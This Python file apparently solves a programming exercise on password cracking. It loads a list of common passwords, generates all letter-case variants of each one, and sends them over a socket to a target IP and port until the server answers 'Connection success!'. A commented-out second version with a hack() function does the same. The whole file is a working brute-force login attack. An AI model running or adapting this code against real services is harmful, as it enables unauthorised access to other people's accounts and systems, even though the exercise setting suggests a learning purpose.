import sys
import socket
import itertools
# from string import ascii_lowercase, digits
 
script, ip_address, port = sys.argv
full_address = (ip_address, int(port))
 
with open("passwords.txt", "r") as pwdfile:
    password = pwdfile.read().splitlines()
    numpassword = [i for i in password if i.isnumeric()]
    alphapassword = list(filter(lambda i: i not in numpassword, password))
 
 
def generate_passwords():
    # chars = list("abcdefghijklmnopqrstuvwxyz0123456789")
    # chars = ascii_lowercase + digits
    for index in range(0, len(alphapassword)):
        pwd=alphapassword[index]
        ourpwd = list(map(''.join, itertools.product(*zip(pwd.upper(), pwd.lower()))))
        for ourpwd in itertools.chain(ourpwd):
            yield "".join(ourpwd)
 
 
with socket.socket() as client_socket:
    client_socket.connect(full_address)
    for password in generate_passwords():
        client_socket.send(password.encode())
        response = client_socket.recv(1024).decode()
        if response == "Connection success!":
            print(password)
            break
        
       # print(password)
# One more with out dividing numbers.
# import socket
# import sys
# import itertools
#
# program_name = sys.argv[0]
# arguments = sys.argv[1:]
#
# HOST = arguments[0]
# PORT = int(arguments[1])
# address = (HOST, PORT)
#
#
# def read_passwords():
#     with open('passwords.txt', 'r', encoding='utf-8') as pwd_file:
#         for line in pwd_file:
#             yield line.strip()
#
#
# with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
#     # connecting to the server
#     client_socket.connect(address)
#
#
#     def is_correct_password(password):
#         # converting to bytes
#         password = password.encode('utf-8')
#         # sending through socket
#         client_socket.send(password)
#         # receiving the response
#         response = client_socket.recv(1024)
#         # decoding from bytes to string
#         response = response.decode('utf-8')
#         if response == 'Connection success!':
#             return True
#         return False
#
#
#     def generate_typical_passwords(password):
#         password_chars = [{char.upper(), char.lower()} for char in password]
#         for pwd in itertools.product(*password_chars):
#             yield ''.join(pwd)
#
#
#     def hack():
#         passwords = read_passwords()
#         for pwd in passwords:
#             pwd_variations = generate_typical_passwords(pwd)
#             for password in pwd_variations:
#                 if is_correct_password(password):
#                     return password
#         return passwords
#
#
#     print(hack())